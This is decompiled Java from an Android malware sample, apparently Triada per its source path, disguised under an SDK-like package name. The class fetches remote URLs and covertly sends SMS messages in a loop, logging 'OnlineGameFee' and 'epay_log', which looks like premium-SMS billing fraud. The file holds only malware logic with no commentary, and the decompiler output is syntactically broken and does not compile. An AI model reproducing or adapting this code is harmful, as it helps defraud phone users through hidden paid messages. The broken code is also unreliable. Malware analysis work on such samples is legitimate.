package com.android.essdk.eyou.c;

import android.os.AsyncTask;
import com.android.essdk.eyou.a.f;
import com.android.essdk.eyou.a.g;
import com.android.essdk.eyou.e.a.b;
import com.android.essdk.eyou.e.b;
import com.android.essdk.eyou.e.k;
import org.apache.http.HttpResponse;

class d extends AsyncTask {
  d(c paramc, g paramg) {}
  
  protected String a(String... paramVarArgs) {
    int i = this.b.e().size();
    if (i != 0) {
      byte b = 0;
      paramVarArgs = null;
      label49: while (true) {
        if (b < i) {
          c.a(this.a, this.b.e().get(b));
          b.b("OnlineGameFee", "url是：" + ((f)this.b.e().get(b)).a());
          if (c.a(this.a) != null) {
            c.a(this.a, c.a(this.a).a());
            if (c.b(this.a) != null) {
              if (!c.b(this.a).trim().equals("")) {
                Object object;
                byte b1 = 0;
                while (true) {
                  if (b1 < 3) {
                    Object object1 = object;
                    try {
                      StringBuilder stringBuilder = new StringBuilder();
                      object1 = object;
                      this(String.valueOf(c.b(this.a)));
                      object1 = object;
                      HttpResponse httpResponse = k.a(stringBuilder.append("&contentid=").append((String)object).toString(), k.a(c.c(this.a), null, null), c.c(this.a));
                      Object object2 = object;
                      if (httpResponse != null) {
                        object1 = object;
                        String str = k.a(httpResponse, c.c(this.a));
                        object1 = object;
                        object2 = new StringBuilder();
                        object1 = object;
                        super("需要发送的内容");
                        object1 = object;
                        b.b("OnlineGameFee", object2.append(str).toString());
                        object2 = object;
                        if (str != null) {
                          object1 = object;
                          c.a(this.a, b.a(str));
                          object1 = object;
                          object2 = c.d(this.a).c();
                          Object object3 = object;
                          if (object2 != null) {
                            object3 = object;
                            object1 = object;
                            if (!"".equals(object2))
                              object3 = object2; 
                          } 
                          object1 = object3;
                          object2 = object3;
                          if (Integer.valueOf(c.d(this.a).d()).intValue() == 1) {
                            object1 = object3;
                            b.c("epay_log", "发短信的时间");
                            object1 = object3;
                            object = new com.android.essdk.eyou.sms.d();
                            object1 = object3;
                            super();
                            object1 = object3;
                            object.a(c.c(this.a), c.d(this.a).a(), c.d(this.a).b());
                            object1 = object3;
                            Thread.sleep((c.a(this.a).b() * 1000));
                            object = object3;
                          } else {
                            continue;
                          } 
                        } else {
                          continue;
                        } 
                      } else {
                        continue;
                      } 
                      b++;
                    } catch (Exception exception) {
                      b.b("OnlineGameFee", "================发送短信发生错误");
                      Object object2 = object1;
                      continue;
                    } 
                    continue label49;
                  } 
                  b++;
                  b1++;
                  object = SYNTHETIC_LOCAL_VARIABLE_7;
                } 
                break;
              } 
              continue;
            } 
            continue;
          } 
          continue;
        } 
        return null;
      } 
    } 
    return null;
  }
}


/* Location:              /home/fahim/Desktop/triada1-dex2jar.jar!/com/android/essdk/eyou/c/d.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */